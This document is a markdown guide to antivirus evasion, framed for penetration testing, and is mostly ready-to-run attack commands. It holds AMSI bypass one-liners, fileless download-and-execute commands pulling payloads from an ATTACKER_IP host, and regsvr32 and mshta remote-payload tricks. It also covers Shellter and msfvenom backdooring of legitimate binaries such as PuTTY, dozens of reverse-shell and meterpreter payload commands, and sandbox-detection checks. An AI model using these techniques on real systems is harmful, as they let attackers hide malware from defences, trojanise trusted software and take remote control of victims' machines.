# Antivirus Evasion Techniques

Comprehensive guide to AV bypass, AMSI bypass, obfuscation, shellcode encoding, and evasion tools for penetration testing engagements.

---

## AV Detection Methods

| Method | Description | Bypass Difficulty |
|--------|-------------|-------------------|
| Signature-based | Hash/pattern matching | Easy |
| Heuristic-based | Rule/algorithm analysis | Medium |
| Behavioral | Runtime behavior analysis | Hard |
| Machine Learning | Cloud-based AI detection | Very Hard |

### AV Engine Components
- **File Engine**: Scheduled/real-time file scans
- **Memory Engine**: Process memory inspection
- **Network Engine**: Traffic analysis
- **Disassembler**: Machine code translation
- **Emulator/Sandbox**: Safe execution environment
- **Browser Plugin**: Web-based threat detection
- **ML Engine**: Unknown threat detection

---

## On-Disk Evasion

### Packers

```bash
# UPX - Ultimate Packer for eXecutables
upx --best malware.exe                    # Maximum compression
upx --brute malware.exe                   # Try all methods
upx -9 --ultra-brute malware.exe          # Extreme compression

# Custom UPX with modified signatures
upx --best malware.exe -o packed.exe
# Then modify UPX signature bytes with hex editor

# MPRESS Packer
mpress.exe -s malware.exe
```

### Crypters

```bash
# Hyperion (AES encryption)
wine hyperion.exe malware.exe encrypted.exe

# Custom XOR Crypter (Python)
python3 << 'EOF'
with open('payload.bin', 'rb') as f:
    shellcode = f.read()
key = 0xAA
encrypted = bytes([b ^ key for b in shellcode])
with open('encrypted.bin', 'wb') as f:
    f.write(encrypted)
EOF

# AES Encryption with OpenSSL
openssl enc -aes-256-cbc -in payload.exe -out encrypted.bin -k MySecretKey
```

### Obfuscators

```bash
# ConfuserEx (.NET)
ConfuserEx.CLI.exe -n payload.exe

# Obfuscator-LLVM (C/C++)
clang -mllvm -fla -mllvm -sub -mllvm -bcf source.c -o obfuscated
```

Code mutation techniques:
1. Semantic equivalent instructions (ADD vs SUB with negative)
2. Dead code insertion (never executed paths)
3. Function reordering (randomize function order)
4. Control flow flattening (flatten if/else to switch)

---

## In-Memory Evasion

### Process Injection (C#)

```csharp
// Key Windows API calls for classic injection:
// 1. OpenProcess - Get handle to target process
// 2. VirtualAllocEx - Allocate memory in target
// 3. WriteProcessMemory - Write shellcode to allocated memory
// 4. CreateRemoteThread - Execute shellcode in target process

// Flags: PROCESS_ALL_ACCESS (0x001F0FFF), MEM_COMMIT|MEM_RESERVE (0x3000), PAGE_EXECUTE_READWRITE (0x40)
```

### Process Hollowing

1. Create target process in suspended state (`CREATE_SUSPENDED`)
2. Get thread context and read PEB for image base
3. Unmap original image with `NtUnmapViewOfSection`
4. Allocate new memory and write payload
5. Update entry point and resume thread

### Reflective DLL Injection

```powershell
# Using Invoke-ReflectivePEInjection
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/Invoke-ReflectivePEInjection.ps1')
Invoke-ReflectivePEInjection -PEPath C:\payload.dll -ProcId 1234

# Manual reflective loading
$PEBytes = [IO.File]::ReadAllBytes('C:\payload.dll')
Invoke-ReflectivePEInjection -PEBytes $PEBytes -ForceASLR
```

### APC Queue Injection

Inject into an alertable thread using `QueueUserAPC` - shellcode executes when the thread enters an alertable wait state.

---

## PowerShell In-Memory Execution

### Shellcode Execution Pattern

1. Use `VirtualAlloc` to allocate RWX memory
2. Copy shellcode bytes with `Marshal::Copy`
3. Create thread with `CreateThread` pointing to allocated memory
4. Wait with `WaitForSingleObject`

```bash
# Generate shellcode in PowerShell format
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f ps1
```

### AMSI Bypass Techniques

```powershell
# Method 1: Memory patching (amsiContext nullification)
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)

# Method 2: Set amsiInitFailed to true
$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))
$field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')
$field.SetValue($null,$true)
```

### Execution Policy Bypasses

```powershell
# Command line bypass
powershell.exe -ExecutionPolicy Bypass -File script.ps1

# Encoded command
$command = Get-Content script.ps1 -Raw
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)
powershell.exe -EncodedCommand $encoded

# Download and execute (fileless)
powershell.exe -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/payload.ps1')"

# Registry modification
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser

# Pipe to PowerShell
Get-Content script.ps1 | powershell.exe -noprofile -
type script.ps1 | powershell.exe -noprofile -
```

---

## Shellter - PE Backdooring

### Installation

```bash
sudo apt update && sudo apt install shellter wine -y
```

### Auto Mode Usage

```bash
shellter
# PE Target: /path/to/putty.exe
# Enable Stealth Mode: Y
# Payload: L (Listed)
# Select: 1 (Meterpreter_Reverse_TCP)
# LHOST: ATTACKER_IP
# LPORT: 443
# Reflective Loader: Y
```

### Best Target Applications
- PuTTY.exe, WinSCP.exe, FileZilla.exe, 7zip.exe, Notepad++.exe, VLC.exe
- Criteria: Legitimate signed binary, common in enterprise, reasonable file size, stable PE structure

---

## Payload Generation (MSFVenom)

### Standard Reverse Shells

```bash
# Windows
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f exe -o shell.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f exe -o shell64.exe

# Meterpreter
msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f exe -o met.exe
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=ATTACKER_IP LPORT=443 -f exe -o met_https.exe

# Stageless (better for evasion)
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f exe -o stageless.exe
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=ATTACKER_IP LPORT=443 -f exe -o met_stageless.exe
```

### Encoding and Obfuscation

```bash
# Single encoder with iterations
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f exe -e x86/shikata_ga_nai -i 10 -o encoded.exe

# Different encoders
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -e x86/fnstenv_mov -i 5 -f exe -o fnstenv.exe

# Chain encoders
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -e x86/shikata_ga_nai -i 3 | msfvenom -e x86/alpha_mixed -i 2 -f exe -o chained.exe
```

### Format-Specific Payloads

```bash
# PowerShell
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f psh -o payload.ps1
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f psh-reflection -o reflection.ps1

# C/C#/Python
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f c -o shellcode.c
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f csharp -o shellcode.cs
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f python -o shellcode.py

# Raw binary
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f raw -o shellcode.bin

# VBA Macro / HTA
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f vba -o macro.vba
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f hta-psh -o payload.hta

# Template injection (backdoor legitimate executable)
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f exe -x putty.exe -k -o backdoored_putty.exe

# Linux / macOS / Android / Java
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f elf -o shell.elf
msfvenom -p osx/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f macho -o shell.macho
msfvenom -p android/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=443 -o payload.apk
msfvenom -p java/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f jar -o payload.jar
```

### Listener Setup

```bash
# Netcat listener
nc -lvnp 443

# Meterpreter handler
msfconsole -q -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST ATTACKER_IP;set LPORT 443;set ExitOnSession false;exploit -j"
```

---

## Advanced Evasion Techniques

### Variable Obfuscation (PowerShell)

```powershell
# String concatenation
$str = "Vir" + "tual" + "Alloc"

# Base64 encoding
$payload = "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/payload.ps1')"
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
powershell.exe -EncodedCommand $encoded

# Format string obfuscation
$api = "{0}{1}{2}" -f 'Virtual','All','oc'

# Character substitution
$cmd = 'I'+'E'+'X'
& $cmd (New-Object Net.WebClient).DownloadString($url)
```

### Invoke-Obfuscation Framework

```powershell
git clone https://github.com/danielbohannon/Invoke-Obfuscation.git
Import-Module .\Invoke-Obfuscation.psd1
Invoke-Obfuscation

# SET SCRIPTPATH C:\payload.ps1
# TOKEN\ALL\1
# OUT C:\obfuscated.ps1
```

### Timing-Based Evasion (PowerShell)

```powershell
# Sleep to avoid sandbox (sandboxes have time limits)
Start-Sleep -Seconds 120

# Check process count (real systems have more)
if ((Get-Process | Measure-Object).Count -lt 50) { exit }

# Check system uptime
$uptime = (Get-Date) - (gcim Win32_OperatingSystem).LastBootUpTime
if ($uptime.TotalMinutes -lt 10) { exit }
```

### Sandbox Detection

```powershell
# Check for VM artifacts
(Get-WmiObject -Class Win32_ComputerSystem).Model -match "Virtual|VMware|VBox"
(Get-WmiObject -Class Win32_BIOS).SerialNumber -match "VMware|VirtualBox"
Test-Path "HKLM:\SOFTWARE\VMware, Inc.\VMware Tools"

# Check for debugging
[System.Diagnostics.Debugger]::IsAttached

# Check RAM (VMs often have less)
$ram = (Get-WmiObject -Class Win32_ComputerSystem).TotalPhysicalMemory / 1GB
if ($ram -lt 4) { exit }

# Check CPU cores
$cores = (Get-WmiObject -Class Win32_Processor).NumberOfCores
if ($cores -lt 2) { exit }
```

### LOLBins (Living Off the Land)

```bash
# Execute via regsvr32
regsvr32 /s /n /u /i:http://ATTACKER_IP/payload.sct scrobj.dll

# Execute via mshta
mshta.exe http://ATTACKER_IP/payload.hta

# Execute via rundll32
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").Run("calc.exe")
```

---

## Quick Commands

```bash
# Standard reverse shell payload
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f exe > payload.exe

# PowerShell reflection payload
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f psh-reflection

# Encoded payload (3 iterations)
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f exe -e x86/shikata_ga_nai -i 3

# File hash for verification
sha256sum payload.exe

# Binary inspection
xxd -b file.txt
```

---

## Testing Tips

- Use isolated testing environments with sample submission disabled
- Stageless payloads are generally better for evasion than staged
- Custom-compiled payloads evade better than default msfvenom output
- Combine multiple techniques (encoding + packing + obfuscation) for best results
- Always profile the target AV solution before crafting payloads
